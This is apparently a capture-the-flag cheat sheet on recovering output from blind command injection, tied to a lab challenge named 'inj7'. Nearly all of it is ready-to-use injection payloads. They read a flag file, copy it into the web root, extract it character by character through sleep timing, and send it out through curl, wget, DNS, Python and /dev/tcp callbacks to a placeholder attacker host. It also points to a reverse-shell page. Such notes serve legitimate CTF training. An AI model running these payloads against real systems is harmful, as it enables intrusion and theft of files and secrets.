# Blind command injection: getting output back

The command runs but its output isn't in the response. Options, best first:

## 1. Is the output written somewhere you can read?
Log pages, "recent activity", report files, generated labels/PDFs, `/static/`. The injected
output lands in that file → read it.
```bash
curl -s -d 'requester=x$(cat /flag/flag)&prio=low' $T/ticket     # response shows nothing
curl -s $T/log | grep -o 'flag{[^}]*}'                          # ...but the log does
```

## 2. Write into the web root yourself
```bash
;cat /flag/flag > /app/static/x.txt        # then GET /static/x.txt
;cp /flag/flag /var/www/html/x.txt
```
Find the web root from errors, `pwd`, or common paths (`/app/static`, `/var/www/html`, `/usr/share/nginx/html`).

## 3. Timing (yes/no per guess)
```bash
;sleep 5                                                      # confirm
;[ "$(cut -c1 /flag/flag)" = "f" ] && sleep 3                # char-by-char
```
`python scripts/injection/blind_cmd_time.py "$T/ping" --data 'host=127.0.0.1;{cmd}' --file /flag/flag`

## 4. Out-of-band (callback to you)
```bash
;curl http://YOUR_IP/$(base64 -w0 /flag/flag)
;wget -qO- "http://YOUR_IP/?d=$(cat /flag/flag|base64 -w0)"
;nslookup $(cat /flag/flag|xxd -p|head -c 60).YOUR_DOMAIN     # DNS exfil
;python3 -c "import urllib.request,base64;urllib.request.urlopen('http://YOUR_IP/?d='+base64.b64encode(open('/flag/flag','rb').read()).decode())"
;bash -c 'cat /flag/flag > /dev/tcp/YOUR_IP/443'              # raw TCP → nc -lvnp 443
```
Listener: `python scripts/xss/catch_server.py --port 443` or `nc -lvnp 443`
→ [tools/oob-listeners.md](../tools/oob-listeners.md). Lab egress allows only 80/443.

## 5. Reverse shell
→ [11-post-exploitation/reverse-shells.md](../11-post-exploitation/reverse-shells.md)

Seen in: `inj7` (DeskOne: `echo <line> >> /tmp/tickets.log`, read via `/log`).
